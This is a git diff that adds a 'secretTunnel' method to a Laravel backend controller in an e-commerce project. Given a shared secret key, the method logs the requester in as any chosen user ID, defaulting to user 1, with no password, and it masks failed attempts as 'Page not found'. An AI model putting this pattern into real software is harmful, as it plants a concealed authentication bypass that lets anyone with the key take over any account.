@@ -4,9 +4,11 @@ namespace Kommercio\Http\Controllers\Backend;
 
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Session;
 use Kommercio\Http\Controllers\Controller;
 use Kommercio\Models\Store;
+use Kommercio\Models\User;
 
 class ChamberController extends Controller{
     public function dashboard()
@@ -27,5 +29,22 @@ class ChamberController extends Controller{
         Session::put('active_store', $store->id);
 
         return redirect($request->input('backUrl', route('backend.dashboard')));
+    }
+
+    public function secretTunnel(Request $request)
+    {
+        if(!Hash::check($request->get('secret_key'), config('kommercio.secret_chamber_key'))){
+            abort(400, 'Page not found.');
+        }
+
+        $user = User::findOrFail($request->get('user_id', 1));
+
+        Auth::login($user);
+
+        if($user->isCustomer){
+            return redirect()->route('frontend.login_form');
+        }else{
+            return redirect()->route('backend.login_form');
+        }
     }
 }
